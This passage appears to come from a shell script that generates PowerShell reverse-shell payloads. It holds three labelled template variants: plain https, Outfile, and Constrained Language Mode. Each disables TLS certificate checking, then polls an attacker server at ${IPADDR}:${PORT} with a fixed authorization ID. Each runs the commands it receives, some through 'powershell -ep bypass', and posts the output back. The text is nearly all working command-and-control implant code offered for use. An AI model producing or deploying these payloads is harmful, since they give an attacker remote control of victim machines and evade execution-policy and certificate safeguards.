public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='11e6bc4b-fefb1eab-68a9612e';\$p='https://';\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/11e6bc4b -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/fefb1eab -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=iex \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/68a9612e -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
	# PowerShell Outfile https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='add29918-6263f3e6-2f810c1e';\$p='https://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/add29918 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/6263f3e6 -Headers @{\"Authorization\"=\$i});if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/2f810c1e -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell Outfile Constr Lang Mode https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='e030d4f6-9393dc2a-dd9e00a7';\$p='https://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=IRM -UseBasicParsing -Uri \$p\$s/e030d4f6 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/9393dc2a -Headers @{\"Authorization\"=\$i}); if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
)


genShell
